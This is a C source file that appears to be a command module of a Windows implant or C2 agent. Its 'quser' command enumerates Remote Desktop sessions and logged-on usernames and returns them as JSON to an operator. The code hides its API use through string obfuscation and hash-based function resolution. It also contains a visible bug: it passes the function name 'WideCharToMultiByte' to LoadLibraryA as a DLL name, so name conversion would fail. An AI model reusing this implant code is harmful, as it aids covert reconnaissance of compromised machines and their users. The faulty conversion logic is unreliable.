#include "config.h"
#ifdef INCLUDE_CMD_QUSER

#include "commands.h"
#include "json_out.h"

typedef BOOL  (WINAPI *fn_WTSEnumerateSessionsW_t)(void*, DWORD, DWORD, void**, DWORD*);
typedef void  (WINAPI *fn_WTSFreeMemory_t)(void*);
typedef BOOL  (WINAPI *fn_WTSQuerySessionInformationW_t)(void*, DWORD, DWORD, void**, DWORD*);

// WTS_SESSION_INFO_W: DWORD SessionId; LPWSTR pSessionName; DWORD State;
#define WTS_SI_SESSIONID 0
#define WTS_SI_NAME      8
#define WTS_SI_STATE     16
#define WTS_SI_SIZE      24

VOID cmd_quser(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    xstr(_wts, "wtsapi32.dll");
    HMODULE h_wts = inst->Win32.LoadLibraryA(_wts);
    fn_WTSEnumerateSessionsW_t pEnum = h_wts ?
        (fn_WTSEnumerateSessionsW_t)resolve_function(h_wts, hash_string_djb2(XSTR("WTSEnumerateSessionsW"))) : NULL;
    fn_WTSFreeMemory_t pFree = h_wts ?
        (fn_WTSFreeMemory_t)resolve_function(h_wts, hash_string_djb2(XSTR("WTSFreeMemory"))) : NULL;
    fn_WTSQuerySessionInformationW_t pQuery = h_wts ?
        (fn_WTSQuerySessionInformationW_t)resolve_function(h_wts, hash_string_djb2(XSTR("WTSQuerySessionInformationW"))) : NULL;
    if (!pEnum || !pFree) {
        package_add_string(inst, response, XSTR("wtsapi32 resolve failed"));
        response->is_error = TRUE;
        return;
    }

    void* sessions = NULL;
    DWORD count = 0;
    if (!pEnum(NULL, 0, 1 /*WTS_ANY_SESSION*/, &sessions, &count) || !sessions) {
        package_add_string(inst, response, XSTR("WTSEnumerateSessions failed"));
        response->is_error = TRUE;
        return;
    }

    JSON_BUF jb;
    j_init(&jb);
    j_append_raw(&jb, "{\"sessions\":[");

    for (DWORD i = 0; i < count; i++) {
        BYTE* entry = (BYTE*)sessions + (i * WTS_SI_SIZE);
        DWORD sid = *(DWORD*)(entry + WTS_SI_SESSIONID);
        wchar_t* sname = *(wchar_t**)(entry + WTS_SI_NAME);
        DWORD state = *(DWORD*)(entry + WTS_SI_STATE);

        if (i) j_append_raw(&jb, ",");
        j_append_raw(&jb, "{\"session_id\":");
        j_append_uint(&jb, sid);
        j_append_raw(&jb, ",\"session_name\":");
        if (sname) {
            char nb[128] = {0};
            xstr(_wc2mb, "WideCharToMultiByte");
            HMODULE h_k32 = inst->Win32.LoadLibraryA(_wc2mb);
            typedef int (WINAPI *fn_wc2mb_t)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
            fn_wc2mb_t wc2mb = h_k32 ? (fn_wc2mb_t)resolve_function(h_k32, hash_string_djb2(XSTR("WideCharToMultiByte"))) : NULL;
            if (wc2mb) wc2mb(0, 0, sname, -1, nb, 128, NULL, NULL);
            j_append_str(&jb, nb);
        } else {
            j_append_str(&jb, "-");
        }
        const char* st = "unknown";
        if (state == 0) st = "active"; else if (state == 1) st = "connected";
        else if (state == 2) st = "connect_query"; else if (state == 3) st = "shadow";
        else if (state == 4) st = "disconnected"; else if (state == 5) st = "idle";
        else if (state == 6) st = "listen"; else if (state == 7) st = "reset";
        else if (state == 8) st = "down"; else if (state == 9) st = "init";
        j_append_raw(&jb, ",\"state\":");
        j_append_str(&jb, st);

        // username via WTSQuerySessionInformation (WTSUserName = 5)
        j_append_raw(&jb, ",\"user\":");
        if (pQuery) {
            void* buf = NULL; DWORD blen = 0;
            if (pQuery(NULL, sid, 5 /*WTSUserName*/, &buf, &blen) && buf) {
                char nb[128] = {0};
                xstr(_wc2mb2, "WideCharToMultiByte");
                HMODULE h_k32 = inst->Win32.LoadLibraryA(_wc2mb2);
                typedef int (WINAPI *fn_wc2mb2_t)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
                fn_wc2mb2_t wc2mb = h_k32 ? (fn_wc2mb2_t)resolve_function(h_k32, hash_string_djb2(XSTR("WideCharToMultiByte"))) : NULL;
                if (wc2mb) wc2mb(0, 0, (wchar_t*)buf, -1, nb, 128, NULL, NULL);
                j_append_str(&jb, nb);
                pFree(buf);
            } else {
                j_append_str(&jb, "-");
            }
        } else {
            j_append_str(&jb, "-");
        }
        j_append_raw(&jb, "}");
    }
    j_append_raw(&jb, "],\"count\":");
    j_append_uint(&jb, count);
    j_append_raw(&jb, "}");
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
    pFree(sessions);
}

#endif
